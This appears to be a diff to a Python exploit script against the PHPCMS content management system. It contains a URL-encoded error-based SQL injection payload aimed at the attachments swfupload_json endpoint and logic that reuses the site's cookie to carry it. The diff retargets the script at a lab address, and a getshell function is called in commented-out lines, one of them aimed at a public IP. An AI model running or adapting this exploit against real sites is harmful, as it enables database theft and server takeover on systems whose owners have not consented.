@@ -27,7 +27,9 @@ def sqli(host):
         #         host, flag)
         url2 = '{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28{}%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26'.format(
                 host, flag)
-        cookies = requests.utils.dict_from_cookiejar(s.cookies)['svyko_siteid']
+        cookie = requests.utils.dict_from_cookiejar(s.cookies)
+        cookies = re.findall(r"(?<=siteid\': \').*(?=\')", str(cookie))[0]
+        # cookies = requests.utils.dict_from_cookiejar(s.cookies)['svyko_siteid']
         data = {"userid_flash": cookies}
         r = s.post(url=url2, data=data)
         a_k = r.headers['Set-Cookie'][61:]
@@ -71,7 +73,7 @@ def getshell(host):
 
 
 if __name__ == '__main__':
-    sqli('http://192.168.119.131/phpcms/install_package')
+    sqli('http://192.168.128.1/phpcms/')
     # getshell('http://101.37.26.138/')
     # address = raw_input("Input your address plz:")
     # getshell(address)
